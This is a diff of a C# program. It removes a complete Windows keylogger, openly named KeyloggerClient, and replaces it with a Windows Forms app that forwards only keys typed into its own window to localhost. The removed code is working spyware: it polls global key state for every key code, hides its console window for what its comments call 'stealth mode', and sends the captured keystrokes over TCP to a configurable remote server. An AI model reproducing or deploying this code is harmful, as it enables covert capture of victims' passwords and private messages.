@@ -1,180 +1,118 @@
 using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-using System.Net.Sockets;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace KeyloggerClient
+public partial class MainForm : Form
 {
-    class Program
+    private TcpClient _client;
+    private NetworkStream _stream;
+    private readonly SemaphoreSlim _sendLock = new SemaphoreSlim(1, 1);
+
+    private const string ServerIp = "127.0.0.1";
+    private const int ServerPort = 12345;
+
+    public MainForm()
     {
-        [DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i);
+        InitializeComponent();
 
-        // Socket connection details
-        private static string serverIP = "192.168.1.100"; // Change to your Python server's IP
-        private static int serverPort = 5555;
+        // KeyPress gives you the actual character (respects Shift, etc.)
+        KeyPreview = true;
+        this.KeyPress += MainForm_KeyPress;
 
-        // Interval to send logs (in milliseconds)
-        private static int sendInterval = 5000; // Every 5 seconds
-        private static int keyBufferLimit = 100; // Send logs if buffer exceeds 100 characters
+        // Optional: if you want arrow keys / function keys too, keep KeyDown:
+        this.KeyDown += MainForm_KeyDown;
+    }
 
-        // Store keystrokes
-        private static StringBuilder keyBuffer = new StringBuilder();
-        private static DateTime lastSentTime = DateTime.Now;
+    private async void MainForm_KeyPress(object sender, KeyPressEventArgs e)
+    {
+        // e.KeyChar is the real character typed
+        string msg = e.KeyChar.ToString();
 
-        // Modifier keys state
-        private static bool shiftPressed = false;
-        private static bool capsLock = Control.IsKeyLocked(Keys.CapsLock);
+        // Add newline so the server can read per-key as a line
+        await SendToServerAsync(msg + "\n");
+    }
 
-        static void Main(string[] args)
+    private async void MainForm_KeyDown(object sender, KeyEventArgs e)
+    {
+        // KeyPress won't fire for these; send them as tokens
+        // (Python side can parse strings like "<LEFT>")
+        string token = e.KeyCode switch
         {
-            // Run the keylogger in a separate thread to prevent UI blocking
-            Thread keylogThread = new Thread(new ThreadStart(StartKeylogger));
-            keylogThread.Start();
+            Keys.Left => "<LEFT>\n",
+            Keys.Right => "<RIGHT>\n",
+            Keys.Up => "<UP>\n",
+            Keys.Down => "<DOWN>\n",
+            Keys.Escape => "<ESC>\n",
+            Keys.Enter => "<ENTER>\n",
+            Keys.Back => "<BACKSPACE>\n",
+            Keys.Tab => "<TAB>\n",
+            _ => null
+        };
 
-            // Hide the console window to run in stealth mode
-            HideConsoleWindow();
-        }
-
-        static void StartKeylogger()
+        if (token != null)
         {
-            try
-            {
-                while (true)
-                {
-                    for (int i = 0; i < 255; i++)
-                    {
-                        int state = GetAsyncKeyState(i);
-
-                        if (state == 1 || state == -32767)
-                        {
-                            HandleKeyPress((Keys)i);
-                        }
-                    }
-
-                    // Send the key buffer to the server at intervals or when the buffer limit is exceeded
-                    if (keyBuffer.Length > 0 && 
-                       (DateTime.Now - lastSentTime).TotalMilliseconds > sendInterval || 
-                       keyBuffer.Length >= keyBufferLimit)
-                    {
-                        SendLogsToServer();
-                        lastSentTime = DateTime.Now;
-                    }
-
-                    Thread.Sleep(10); // Prevent CPU overuse
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error: " + ex.Message);
-            }
+            e.SuppressKeyPress = true; // avoids ding/beep in some controls
+            await SendToServerAsync(token);
         }
+    }
 
-        static void HandleKeyPress(Keys key)
+    private async Task EnsureConnectedAsync()
+    {
+        if (_client != null && _client.Connected && _stream != null)
+            return;
+
+        CleanupConnection();
+
+        _client = new TcpClient();
+        await _client.ConnectAsync(ServerIp, ServerPort);
+        _stream = _client.GetStream();
+    }
+
+    private async Task SendToServerAsync(string message)
+    {
+        await _sendLock.WaitAsync();
+        try
         {
-            switch (key)
-            {
-                case Keys.Enter:
-                    keyBuffer.Append("[ENTER]");
-                    break;
-                case Keys.Space:
-                    keyBuffer.Append(" ");
-                    break;
-                case Keys.Back:
-                    keyBuffer.Append("[BACKSPACE]");
-                    break;
-                case Keys.Tab:
-                    keyBuffer.Append("[TAB]");
-                    break;
-                case Keys.ShiftKey:
-                    shiftPressed = !shiftPressed;
-                    break;
-                case Keys.CapsLock:
-                    capsLock = !capsLock;
-                    break;
-                case Keys.LControlKey:
-                case Keys.RControlKey:
-                    keyBuffer.Append("[CTRL]");
-                    break;
-                case Keys.LMenu:
-                case Keys.RMenu:
-                    keyBuffer.Append("[ALT]");
-                    break;
-                default:
-                    // Handle alphabetic and numeric keys, check for shift or caps lock states
-                    if (char.IsLetterOrDigit((char)key))
-                    {
-                        char keyChar = (char)key;
+            await EnsureConnectedAsync();
 
-                        if (shiftPressed || capsLock)
-                            keyBuffer.Append(char.ToUpper(keyChar));
-                        else
-                            keyBuffer.Append(char.ToLower(keyChar));
-                    }
-                    else
-                    {
-                        // Log other special characters as is
-                        keyBuffer.Append($"[{key}]");
-                    }
-                    break;
-            }
+            byte[] data = Encoding.UTF8.GetBytes(message);
+            await _stream.WriteAsync(data, 0, data.Length);
+            await _stream.FlushAsync();
         }
-
-        static void SendLogsToServer()
+        catch (Exception ex)
         {
-            try
-            {
-                // Connect to the Python server
-                using (TcpClient client = new TcpClient(serverIP, serverPort))
-                {
-                    NetworkStream stream = client.GetStream();
-
-                    // Convert the key buffer to bytes
-                    byte[] data = Encoding.ASCII.GetBytes(keyBuffer.ToString());
-
-                    // Send the data
-                    stream.Write(data, 0, data.Length);
-
-                    // Receive confirmation from the server
-                    byte[] responseData = new byte[256];
-                    int bytes = stream.Read(responseData, 0, responseData.Length);
-                    string response = Encoding.ASCII.GetString(responseData, 0, bytes);
-
-                    if (response == "ok")
-                    {
-                        // Clear the key buffer after successful transmission
-                        keyBuffer.Clear();
-                    }
-                }
-            }
-            catch (SocketException ex)
-            {
-                Console.WriteLine("Socket Error: " + ex.Message);
-                // Retry sending later
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error: " + ex.Message);
-            }
+            Console.WriteLine("Send error: " + ex.Message);
+            CleanupConnection();
         }
-
-        // Hide the console window for stealth mode
-        static void HideConsoleWindow()
+        finally
         {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
+            _sendLock.Release();
         }
+    }
 
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetConsoleWindow();
+    private void CleanupConnection()
+    {
+        try { _stream?.Close(); } catch { }
+        try { _client?.Close(); } catch { }
+        _stream = null;
+        _client = null;
+    }
 
-        [DllImport("user32.dll")]
-        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    protected override void OnFormClosed(FormClosedEventArgs e)
+    {
+        CleanupConnection();
+        _sendLock.Dispose();
+        base.OnFormClosed(e);
+    }
 
-        private const int SW_HIDE = 0;
-        private const int SW_SHOW = 5;
+    [STAThread]
+    static void Main()
+    {
+        Application.EnableVisualStyles();
+        Application.SetCompatibleTextRenderingDefault(false);
+        Application.Run(new MainForm());
     }
 }
